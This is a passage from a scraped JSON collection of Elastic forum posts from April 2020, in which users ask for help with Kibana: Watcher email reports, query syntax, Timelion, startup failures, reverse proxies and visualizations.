      "Kibana"
    ],
    "author": "",
    "date": "April 14, 2020, 6:27pm April 14, 2020, 10:24pm April 15, 2020, 3:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3ecd1216-6444-4dba-944d-c6d6039557ab",
    "url": "https://discuss.elastic.co/t/how-to-put-kibana-dashboard-png-inline-in-the-body-of-automated-email-using-watcher/227978",
    "title": "How to put Kibana Dashboard PNG inline in the body of automated email using Watcher?",
    "category": [
      "Kibana"
    ],
    "author": "qualispec",
    "date": "April 14, 2020, 6:35pm April 14, 2020, 9:22pm April 15, 2020, 2:05am",
    "body": "I am using Kibana 7.5.0. I am trying to use Watcher to send automated emails of Kibana Dashboards on a schedule. I've read this documentation: https://www.elastic.co/guide/en/elasticsearch/reference/current/actions-email.html I am able to successfully have Watcher send emails of Kibana dashboards with the PDF or PNG as an attachment. However, I'd like for the email to have the PNG inline in the body of the email. I read this post where someone says they were able to successfully do this: Is there a way to put kibana dashboard png report in the body of the email I'm using a copy of their Watcher code, but it's not working for me. The email is sent with PNG as an attachment, not inline in the email body. I am receiving this email in Gmail, if that matters. Here's what my Watcher code looks like: { \"trigger\": { \"schedule\": { \"interval\": \"15m\" } }, \"input\": { \"none\": {} }, \"condition\": { \"always\": {} }, \"actions\": { \"email_report\": { \"email\": { \"profile\": \"standard\", \"attachments\": { \"test_report.png\": { \"reporting\": { \"url\": \"the URL I get from the Kibana dashboard --> Share --> PNG Reports --> Copy POST URL\", \"retries\": 3, \"interval\": \"5m\", \"inline\": true, \"auth\": { \"basic\": { \"username\": \"reporting_user\", \"password\": \"::es_redacted::\" } } } } }, \"to\": [ \"my_email@gmail.com\" ], \"subject\": \"Test Report - PNG Inline Version\", \"body\": { \"html\": \"<p><b> Summary - 2 Week Trend <b><p> <img src=test_report.png>\" } } } } } What am I doing wrong? Is there some other configuration I need to do to make this work? Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9fa81ec2-b6a5-47b8-9089-7f4fb1581ac2",
    "url": "https://discuss.elastic.co/t/kibana-multiple-query-is-not-allowed/227814",
    "title": "Kibana multiple query is not allowed",
    "category": [
      "Kibana"
    ],
    "author": "111316",
    "date": "April 13, 2020, 6:25pm April 14, 2020, 10:33pm April 15, 2020, 12:17am",
    "body": "Hello! To use multiple queries as below, an error occurs. Please tell me how to use 2 IP bands. { \"query\": { \"bool\": { \"should\": [ { \"match_phrase\": { \"flow.dst_addr\": {\"gte\": \"1.1.1.1\", \"lt\": \"1.1.1.254\"}} }, { \"match_phrase\": { \"flow.dst_addr\": {\"gte\": \"2.2.2.1\", \"lt\": \"2.2.2.254\"} } } ], \"minimum_should_match\": 1 } } } ※ Error in visualization [esaggs] > Request to Elasticsearch failed: {\"error\":{\"root_cause\":[{\"type\":\"parsing_exception\",\"reason\":\"[match_phrase] query does not support [gte]\",\"line\":1,\"col\":1475}],\"type\":\"parsing_exception\",\"reason\":\"[match_phrase] query does not support [gte]\",\"line\":1,\"col\":1475},\"status\":400}",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7e4e065e-aef8-4ab6-94cc-0129944d502e",
    "url": "https://discuss.elastic.co/t/running-total-of-living-population/227998",
    "title": "Running Total of Living Population",
    "category": [
      "Kibana"
    ],
    "author": "sivel",
    "date": "April 14, 2020, 9:03pm April 14, 2020, 10:19pm",
    "body": "Let's assume that I have a data set that includes a single document per person. The data will include a bornOn and diedOn field. diedOn may not have a value. I was looking at creating a Timelion that shows me a running total of living population. I'm not super knowledgeable about Timelion, and I'm not sure how I can effectively filter per item between bornOn and diedOn based on the date being rendered. I get that something like the following is a cumulative sum of people that ever lived, but I need to compare whether that person was actually alive based on the date being rendered: .es(index=population, timefield=bornOn).cusum() Any tips?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "024f6861-6cb4-49ce-a899-8ae825d2377f",
    "url": "https://discuss.elastic.co/t/kibana-server-is-not-ready-yet-kibana-7-6-2-new-install/227840",
    "title": "Kibana server is not ready yet - kibana 7.6.2 - New Install",
    "category": [
      "Kibana"
    ],
    "author": "surfd4wg",
    "date": "April 14, 2020, 2:14am April 14, 2020, 4:33am April 14, 2020, 4:13pm April 14, 2020, 4:28pm April 14, 2020, 5:13pm April 14, 2020, 6:54pm April 14, 2020, 6:59pm April 14, 2020, 7:19pm April 14, 2020, 8:43pm",
    "body": "This is from localhost:9200. { \"name\" : \"rex-VirtualBox\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"na\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"deb\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } Looking for some help please.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "fb00cd31-7b6a-4109-8e6c-535f47d826e1",
    "url": "https://discuss.elastic.co/t/failed-to-start-kibana-after-adding-more-elasticsearch-host/227846",
    "title": "Failed to start kibana after adding more elasticsearch.host",
    "category": [
      "Kibana"
    ],
    "author": "gilang_bilbisri",
    "date": "April 14, 2020, 5:11am April 14, 2020, 4:40am April 14, 2020, 7:05am April 14, 2020, 4:32pm",
    "body": "hello. am using Centos 7, kibana 7.6,elasticsearch 7.6. i have problems with my kibana. It won't start after adding 1 more elasticsearch.host on kibana config. Before that i only have 2 elasticsearch host in my config. and then there is no specify error i can't found in my configuration. BUT after i rollback my configuration to deleted the elasticsearch.host. it work well anyone know what happent? or can i get reference for it? here the error from systemctl status kibana ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; enabled; vendor preset: disabled) Active: failed (Result: start-limit) since Mon 2020-04-13 22:25:53 WIB; 11h ago Process: 4798 ExecStart=/usr/share/kibana/bin/kibana -c /etc/kibana/kibana.yml (code=exited, status=1/FAILURE) Main PID: 4798 (code=exited, status=1/FAILURE) Apr 13 22:25:50 monitoring systemd[1]: Unit kibana.service entered failed state. Apr 13 22:25:50 monitoring systemd[1]: kibana.service failed. Apr 13 22:25:53 monitoring systemd[1]: kibana.service holdoff time over, scheduling restart. Apr 13 22:25:53 monitoring systemd[1]: Stopped Kibana. Apr 13 22:25:53 monitoring systemd[1]: start request repeated too quickly for kibana.service Apr 13 22:25:53 monitoring systemd[1]: Failed to start Kibana. Apr 13 22:25:53 monitoring systemd[1]: Unit kibana.service entered failed state. Apr 13 22:25:53 monitoring systemd[1]: kibana.service failed. there is my kibana.yml # Kibana is served by a back end server. This setting specifies the port to use. server.port: 5601 # Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values. # The default is 'localhost', which usually means remote machines will not be able to connect. # To allow connections from remote users, set this parameter to a non-loopback address. server.host: \"monitoring\" # Enables you to specify a path to mount Kibana at if you are running behind a proxy. # Use the `server.rewriteBasePath` setting to tell Kibana if it should remove the basePath # from requests it receives, and to prevent a deprecation warning at startup. # This setting cannot end in a slash. #server.basePath: \"\" # Specifies whether Kibana should rewrite requests that are prefixed with # `server.basePath` or require that they are rewritten by your reverse proxy. # This setting was effectively always `false` before Kibana 6.3 and will # default to `true` starting in Kibana 7.0. #server.rewriteBasePath: false # The maximum payload size in bytes for incoming server requests. #server.maxPayloadBytes: 1048576 # The Kibana server's name. This is used for display purposes. server.name: \"ASDP-MONITORING\" # The URLs of the Elasticsearch instances to use for all your queries. elasticsearch.hosts: [\"http://100.XXX.XXX.XXX:9200\", \"http://100.XXX.XXX.XXX:9200\", \"http://100.XXX.XXX.XXX:9200\"] # When this setting's value is true Kibana uses the hostname specified in the server.host # setting. When the value of this setting is false, Kibana uses the hostname of the host # that connects to this Kibana instance. #elasticsearch.preserveHost: true # Kibana uses an index in Elasticsearch to store saved searches, visualizations and # dashboards. Kibana creates a new index if the index doesn't already exist. #kibana.index: \".kibana\" # The default application to load. #kibana.defaultAppId: \"home\" # If your Elasticsearch is protected with basic authentication, these settings provide # the username and password that the Kibana server uses to perform maintenance on the Kibana # index at startup. Your Kibana users still need to authenticate with Elasticsearch, which # is proxied through the Kibana server. #elasticsearch.username: \"kibana\" #elasticsearch.password: \"pass\" # Enables SSL and paths to the PEM-format SSL certificate and SSL key files, respectively. # These settings enable SSL for outgoing requests from the Kibana server to the browser. #server.ssl.enabled: false #server.ssl.certificate: /path/to/your/server.crt #server.ssl.key: /path/to/your/server.key # Optional settings that provide the paths to the PEM-format SSL certificate and key files. # These files are used to verify the identity of Kibana to Elasticsearch and are required when # xpack.security.http.ssl.client_authentication in Elasticsearch is set to required. #elasticsearch.ssl.certificate: /path/to/your/client.crt #elasticsearch.ssl.key: /path/to/your/client.key # Optional setting that enables you to specify a path to the PEM file for the certificate # authority for your Elasticsearch instance. #elasticsearch.ssl.certificateAuthorities: [ \"/path/to/your/CA.pem\" ] # To disregard the validity of SSL certificates, change this setting's value to 'none'. #elasticsearch.ssl.verificationMode: full # Time in milliseconds to wait for Elasticsearch to respond to pings. Defaults to the value of # the elasticsearch.requestTimeout setting. #elasticsearch.pingTimeout: 1500 # Time in milliseconds to wait for responses from the back end or Elasticsearch. This value # must be a positive integer. #elasticsearch.requestTimeout: 30000 # List of Kibana client-side headers to send to Elasticsearch. To send *no* client-side # headers, set this value to [] (an empty list). #elasticsearch.requestHeadersWhitelist: [ authorization ] # Header names and values that are sent to Elasticsearch. Any custom headers cannot be overwritten # by client-side headers, regardless of the elasticsearch.requestHeadersWhitelist configuration. #elasticsearch.customHeaders: {} # Time in milliseconds for Elasticsearch to wait for responses from shards. Set to 0 to disable. #elasticsearch.shardTimeout: 30000 # Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying. #elasticsearch.startupTimeout: 5000 # Logs queries sent to Elasticsearch. Requires logging.verbose set to true. #elasticsearch.logQueries: false # Specifies the path where Kibana creates the process ID file. #pid.file: /var/run/kibana.pid # Enables you specify a file where Kibana stores log output. #logging.dest: stdout # Set the value of this setting to true to suppress all logging output. #logging.silent: false # Set the value of this setting to true to suppress all logging output other than error messages. #logging.quiet: false # Set the value of this setting to true to log all events, including system usage information # and all requests. #logging.verbose: false # Set the interval in milliseconds to sample system and process performance # metrics. Minimum is 100ms. Defaults to 5000. #ops.interval: 5000 # Specifies locale to be used for all localizable strings, dates and number formats. # Supported languages are the following: English - en , by default , Chinese - zh-CN . #i18n.locale: \"en\" There is the log from Journalctl -fu kibana.service -- Logs begin at Mon 2020-04-13 18:23:51 WIB. -- Apr 13 22:25:49 monitoring kibana[4798]: FATAL [index_not_found_exception] no such index [.kibana_task_manager], with { resource.type=\"index_or_alias\" & resource.id=\".kibana_task_manager\" & index_uuid=\"_na_\" & index=\".kibana_task_manager\" } :: {\"path\":\"/.kibana_task_manager/_count\",\"query\":{},\"body\":\"{\\\"query\\\":{\\\"bool\\\":{\\\"should\\\":[{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"graph-workspace\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.graph-workspace\\\":\\\"7.0.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"space\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.space\\\":\\\"6.6.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"map\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.map\\\":\\\"7.6.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"canvas-workpad\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.canvas-workpad\\\":\\\"7.0.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"task\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.task\\\":\\\"7.6.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"index-pattern\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.index-pattern\\\":\\\"7.6.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"visualization\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.visualization\\\":\\\"7.4.2\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"dashboard\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.dashboard\\\":\\\"7.3.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"search\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.search\\\":\\\"7.4.0\\\"}}}}]}}]}}}\",\"statusCode\":404,\"response\":\"{\\\"error\\\":{\\\"root_cause\\\":[{\\\"type\\\":\\\"index_not_found_exception\\\",\\\"reason\\\":\\\"no such index [.kibana_task_manager]\\\",\\\"resource.type\\\":\\\"index_or_alias\\\",\\\"resource.id\\\":\\\".kibana_task_manager\\\",\\\"index_uuid\\\":\\\"_na_\\\",\\\"index\\\":\\\".kibana_task_manager\\\"}],\\\"type\\\":\\\"index_not_found_exception\\\",\\\"reason\\\":\\\"no such index [.kibana_task_manager]\\\",\\\"resource.type\\\":\\\"index_or_alias\\\",\\\"resource.id\\\":\\\".kibana_task_manager\\\",\\\"index_uuid\\\":\\\"_na_\\\",\\\"index\\\":\\\".kibana_task_manager\\\"},\\\"status\\\":404}\"} Apr 13 22:25:50 monitoring systemd[1]: kibana.service: main process exited, code=exited, status=1/FAILURE Apr 13 22:25:50 monitoring systemd[1]: Unit kibana.service entered failed state. Apr 13 22:25:50 monitoring systemd[1]: kibana.service failed. Apr 13 22:25:53 monitoring systemd[1]: kibana.service holdoff time over, scheduling restart. Apr 13 22:25:53 monitoring systemd[1]: Stopped Kibana. Apr 13 22:25:53 monitoring systemd[1]: start request repeated too quickly for kibana.service Apr 13 22:25:53 monitoring systemd[1]: Failed to start Kibana. Apr 13 22:25:53 monitoring systemd[1]: Unit kibana.service entered failed state. Apr 13 22:25:53 monitoring systemd[1]: kibana.service failed. `",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "79bf2bc2-a84d-41a3-9a92-eb76e4f5c629",
    "url": "https://discuss.elastic.co/t/kibana-cloud-doesnt-load/227951",
    "title": "Kibana cloud doesn't load",
    "category": [
      "Kibana"
    ],
    "author": "runnyrun",
    "date": "April 14, 2020, 3:24pm April 14, 2020, 3:42pm",
    "body": "Hey, I just started the free trial of the Kibana cloud. I clicked on the launch under Kibaba, but it doesn't get loaded in the Webbrowser \" This site can’t be reached\". Please help.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "de2cc1d1-967f-4346-ae93-5f9a35806d55",
    "url": "https://discuss.elastic.co/t/kibana-type-of-the-chart/227936",
    "title": "Kibana Type of the chart",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 14, 2020, 2:19pm April 14, 2020, 3:00pm",
    "body": "Is there any way to identify the type of the chart ( like area , TSVB ) by looking at the chart in the dashboard - perhaps with a tooltip or help. This is generally nice to have as some of the charts are obvious by looking at them like pie, bar charts. But in some charts, it is really hard to figure it out unless we figure it out from \"Visualize\" module.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5aff272e-1def-4213-90b4-5bc438ff5df5",
    "url": "https://discuss.elastic.co/t/kibana-filter-is-not-working/227923",
    "title": "Kibana Filter is not working",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 14, 2020, 1:29pm April 14, 2020, 2:00pm April 14, 2020, 2:16pm April 14, 2020, 6:57pm",
    "body": "I applied a filter : category.keyword: Men's Shoes . However, the widget \"[eCommerce] Sales by Category\" still shows other categories as well. What is the reasoning behind this . Check out here ,and see the widget \"[eCommerce] Sales by Category\" , there are other categories displayed too apart from the chosen category. https://demo.elastic.co/app/kibana#/dashboard/722b74f0-b882-11e8-a6d9-e546fe2bba5f?_g=(filters:!(),refreshInterval:(pause:!f,value:900000),time:(from:now-7d,to:now))&_a=(description:'Analyze%20mock%20eCommerce%20orders%20and%20revenue',filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:ff959d40-b880-11e8-a6d9-e546fe2bba5f,key:category.keyword,negate:!f,params:(query:'Men!'s%20Shoes'),type:phrase),query:(match:(category.keyword:(query:'Men!'s%20Shoes',type:phrase))))),fullScreenMode:!f,options:(hidePanelTitles:!f,useMargins:!t),panels:!((embeddableConfig:(vis:(colors:('Men!'s%20Accessories':%2382B5D8,'Men!'s%20Clothing':%23F9BA8F,'Men!'s%20Shoes':%23F29191,'Women!'s%20Accessories':%23F4D598,'Women!'s%20Clothing':%2370DBED,'Women!'s%20Shoes':%23B7DBAB))),gridData:(h:10,i:'1',w:36,x:12,y:18),id:'37cc8650-b882-11e8-a6d9-e546fe2bba5f',panelIndex:'1',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:(FEMALE:%236ED0E0,MALE:%23447EBC),legendOpen:!f)),gridData:(h:11,i:'2',w:12,x:12,y:7),id:ed8436b0-b88b-11e8-a6d9-e546fe2bba5f,panelIndex:'2',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:7,i:'3',w:18,x:0,y:0),id:'09ffee60-b88c-11e8-a6d9-e546fe2bba5f',panelIndex:'3',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:7,i:'4',w:30,x:18,y:0),id:'1c389590-b88d-11e8-a6d9-e546fe2bba5f',panelIndex:'4',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:11,i:'5',w:48,x:0,y:28),id:'45e07720-b890-11e8-a6d9-e546fe2bba5f',panelIndex:'5',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:10,i:'6',w:12,x:0,y:18),id:'10f1a240-b891-11e8-a6d9-e546fe2bba5f',panelIndex:'6',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:11,i:'7',w:12,x:0,y:7),id:b80e6540-b891-11e8-a6d9-e546fe2bba5f,panelIndex:'7',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:('0%20-%2050':%23E24D42,'50%20-%2075':%23EAB839,'75%20-%20100':%237EB26D),defaultColors:('0%20-%2050':'rgb(165,0,38)','50%20-%2075':'rgb(255,255,190)','75%20-%20100':'rgb(0,104,55)'),legendOpen:!f)),gridData:(h:11,i:'8',w:12,x:24,y:7),id:'4b3ec120-b892-11e8-a6d9-e546fe2bba5f',panelIndex:'8',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:('0%20-%202':%23E24D42,'2%20-%203':%23F2C96D,'3%20-%204':%239AC48A),defaultColors:('0%20-%202':'rgb(165,0,38)','2%20-%203':'rgb(255,255,190)','3%20-%204':'rgb(0,104,55)'),legendOpen:!f)),gridData:(h:11,i:'9',w:12,x:36,y:7),id:'9ca7aa90-b892-11e8-a6d9-e546fe2bba5f',panelIndex:'9',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:18,i:'10',w:48,x:0,y:54),id:'3ba638e0-b894-11e8-a6d9-e546fe2bba5f',panelIndex:'10',type:search,version:'7.5.1'),(embeddableConfig:(isLayerTOCOpen:!f,mapCenter:(lat:45.88578,lon:-15.07605,zoom:2.11),openTOCDetails:!()),gridData:(h:15,i:'11',w:24,x:0,y:39),id:'2c9c1f60-1909-11e9-919b-ffe5949a18d2',panelIndex:'11',type:map,version:'7.5.1'),(embeddableConfig:(),gridData:(h:15,i:'12',w:24,x:24,y:39),id:b72dd430-bb4d-11e8-9c84-77068524bcab,panelIndex:'12',type:visualization,version:'7.5.1')),query:(language:kuery,query:''),timeRestore:!t,title:'%5BeCommerce%5D%20Revenue%20Dashboard',viewMode:view)",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "725af7f2-22f7-419e-bc3e-51601ac2e0ff",
    "url": "https://discuss.elastic.co/t/why-i-am-not-ablle-to-select-my-available-fields-in-percentiles-aggregation-field-option-in-kibana-visualization/227900",
    "title": "Why i am not ablle to select my available fields in Percentiles Aggregation Field option in kibana visualization",
    "category": [
      "Kibana"
    ],
    "author": "Pacha_Gopi",
    "date": "April 14, 2020, 11:31am April 14, 2020, 11:51am April 14, 2020, 12:01pm April 14, 2020, 12:14pm April 14, 2020, 12:19pm April 14, 2020, 12:35pm April 14, 2020, 1:02pm April 14, 2020, 2:27pm",
    "body": "Hi all, I am using latest version of kibana and my task is visualize the API responce time (upstream_responce_time in nginx) in kibana dash board on the values of p50,p90,p99.when i select Percentiles Aggregation opition in the kibana visualization i am not getting the all avaialblle fields that i defined i am getting on two options loke mentioned below. date @timestamp number log.offset My question is why i am not able to view different fields otherthan timestamp and logset. i have upstream_responce_time and request time and more,i am attaching both the screenshots of available fields and visualization can anyonne help me out of this isuue. Screenshot from 2020-04-14 16-48-461920×1080 209 KB Screenshot from 2020-04-14 16-48-461920×1080 209 KB Screenshot from 2020-04-14 16-55-011920×1080 454 KB",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3f165182-6805-42a4-95a6-1a19cde95f0e",
    "url": "https://discuss.elastic.co/t/payload-too-large/227858",
    "title": "Payload too large",
    "category": [
      "Kibana"
    ],
    "author": "fadjar340",
    "date": "April 14, 2020, 6:42am April 14, 2020, 7:50am April 14, 2020, 1:33pm",
    "body": "I use snmp input for logstash, and the fields more than 7000, the limit fields already covered, but the kibana index pattern shown this message: Payload Too Large. Below the error Wrapper@http://10.210.20.98/kibana/bundles/commons.bundle.js:3:3012320 HttpFetchError@http://10.210.20.98/kibana/bundles/commons.bundle.js:3:3014102 fetchResponse$@http://10.210.20.98/kibana/bundles/commons.bundle.js:3:3009775 s@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774550 l/i._invoke</<@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774304 v/</e[t]@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774907 s@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774550 t@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:775046 t/<@http://10.210.20.98/kibana/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:775196 Any suggestion? Fadjar Tandabawana",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e6bae1f1-b29a-4c73-a5b3-0db047a358f3",
    "url": "https://discuss.elastic.co/t/kibana-translate/226434",
    "title": "Kibana translate",
    "category": [
      "Kibana"
    ],
    "author": "Vlad_Piratov",
    "date": "April 3, 2020, 3:40pm April 3, 2020, 4:09pm April 5, 2020, 10:24am April 5, 2020, 9:16pm April 14, 2020, 12:39pm",
    "body": "Hi! You must localize Kibana into Russian. But I can't find instructions on how to do it anywhere. All links lead to I18n. If you do not find it difficult - please explain. Thanks GitHub elastic/kibana Your window into the Elastic Stack. Contribute to elastic/kibana development by creating an account on GitHub.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "9040d0aa-c939-44ac-8743-6daadc3e5302",
    "url": "https://discuss.elastic.co/t/nginx-reverse-proxy-for-kibana-cannot-authenticate/227463",
    "title": "Nginx reverse proxy for Kibana : cannot authenticate",
    "category": [
      "Kibana"
    ],
    "author": "IanCap",
    "date": "April 10, 2020, 9:22am April 10, 2020, 12:56pm April 10, 2020, 1:23pm April 10, 2020, 1:55pm April 10, 2020, 2:04pm April 10, 2020, 2:24pm April 10, 2020, 2:46pm April 10, 2020, 3:02pm April 10, 2020, 3:08pm April 10, 2020, 3:18pm April 14, 2020, 11:11am",
    "body": "Hi, I'm currently trying to set a CNAME to a Clouded Kibana. In my attempt to do so, i contacted the support (during the trial period) who was kind enough to confirm that i needed a reverse proxy to work the problem and make the CNAME point to the said reverse proxy - see link bellow : Nginx proxy for Elastic Cloud instance Elasticsearch I am trying to create an Nginx reverse proxy to a cloud.elastic.co instance. All attempts at this result in the following message: {\"ok\":false,\"message\":\"Unknown cluster.\"} upstream elasticsearch { server {{my instance}}.us-west-2.aws.found.io:9243; keepalive 15; } server { listen 9200; server_name localhost; location / { proxy_pass https://elasticsearch; proxy_http_version 1.1; proxy_set_header Connection \"Keep-Alive\"; proxy_set_header Proxy-Conne… I'm currently working on a reverse proxy via nginx. After configuring the proxy, whenever i try to access Kibana i get the following message {\"statusCode\":401,\"error\":\"Unauthorized\",\"message\":\"[security_exception] unable to authenticate user [elastic] for REST request [/_xpack/security/_authenticate], with { header={ WWW-Authenticate={ 0=\\\"Bearer realm=[\\\\\\](file:///) \"security[\\\\\\](file:///)\"\\\" & 1=\\\"ApiKey\\\" & 2=\\\"Basic realm=[\\\\\\](file:///)\"security[\\\\\\](file:///)\" charset=[\\\\\\](file:///)\"UTF-8[\\\\\\](file:///)\"\\\" } } }\"} I tried to authenticate via curl but i get the same error after being asked for my password After researching the issues thanks to the following links : https://www.elastic.co/guide/en/kibana/6.8/_using_reverse_proxies.html?blade=supportportalv1 https://www.elastic.co/guide/en/kibana/6.8/reporting-settings-kb.html#reporting-kibana-server-settings https://www.elastic.co/guide/en/kibana/6.8/using-kibana-with-security.html I understand that i need to update the kibana.yml file or set some x-pack configurations. Could you explain how i'm suppose to do so on Elastic Cloud ? Is there a way to work the problem through the dev console or should i set the file via curl ? Could you give me additional insights on how to do so ? Thanks in advance !",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "d58e53f1-72f0-48b0-88bc-6af32ec5e1b1",
    "url": "https://discuss.elastic.co/t/kibana-date-histogram-interpretation/227745",
    "title": "Kibana Date histogram - interpretation",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 13, 2020, 8:27am April 13, 2020, 3:16pm April 13, 2020, 3:45pm April 14, 2020, 8:11am April 14, 2020, 10:25am April 14, 2020, 11:10am April 14, 2020, 11:10am",
    "body": "I am looking at the demo dashboard - https://demo.elastic.co/app/kibana#/visualize/edit/37cc8650-b882-11e8-a6d9-e546fe2bba5f?_g=(refreshInterval:(pause:!f,value:900000),time:(from:'2020-03-25T11:15:07.466Z',to:'2020-04-12T18:30:00.000Z'))&_a=(filters:!(),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!((enabled:!t,id:'1',params:(field:total_quantity),schema:metric,type:sum),(enabled:!t,id:'2',params:(drop_partials:!f,extended_bounds:(),field:order_date,interval:w,min_doc_count:1,scaleMetricValues:!f,timeRange:(from:'2020-03-25T11:15:07.466Z',to:'2020-04-12T18:30:00.000Z'),useNormalizedEsInterval:!t),schema:segment,type:date_histogram),(enabled:!t,id:'3',params:(field:category.keyword,missingBucket:!f,missingBucketLabel:Missing,order:desc,orderBy:'1',otherBucket:!f,otherBucketLabel:Other,size:5),schema:group,type:terms)),params:(addLegend:!t,addTimeMarker:!f,addTooltip:!t,categoryAxes:!((id:CategoryAxis-1,labels:(show:!t,truncate:100),position:bottom,scale:(type:linear),show:!t,style:(),title:(),type:category)),dimensions:(series:!((accessor:1,aggType:terms,format:(id:terms,params:(id:string,missingBucketLabel:Missing,otherBucketLabel:Other)),params:())),x:(accessor:0,aggType:date_histogram,format:(id:date,params:(pattern:YYYY-MM-DD)),params:(bounds:(max:'2020-04-12T18:30:00.000Z',min:'2020-03-25T11:15:07.466Z'),date:!t,format:YYYY-MM-DD,interval:P7D,intervalESUnit:w,intervalESValue:1)),y:!((accessor:2,aggType:sum,format:(id:number),params:()))),grid:(categoryLines:!f,style:(color:%23eee)),labels:(),legendPosition:top,seriesParams:!((data:(id:'1',label:'Sum%20of%20total_quantity'),drawLinesBetweenPoints:!t,interpolate:linear,mode:stacked,show:true,showCircles:!t,type:area,valueAxis:ValueAxis-1)),thresholdLine:(color:%2334130C,show:!f,style:full,value:10,width:1),times:!(),type:area,valueAxes:!((id:ValueAxis-1,labels:(filter:!f,rotate:0,show:!t,truncate:100),name:LeftAxis-1,position:left,scale:(mode:normal,type:linear),show:!t,style:(),title:(text:'Sum%20of%20total_quantity'),type:value))),title:'',type:area)) Few questions 1 . I see a warning - This are may contain partial data. The selected time range does not fully cover it. What does it mean by partial data and how to interpret this message? Another question with respect to - how x axis metric were created like the following ( i see there is a gap of 4 days between each metric , when the histogram is created on the basis of orderdate per 12 hours . 2020-03-27 00:00 2020-03-31 00:00 2020-04-03 00:00 2020-04-07 00:00 2020-04-11 00:00 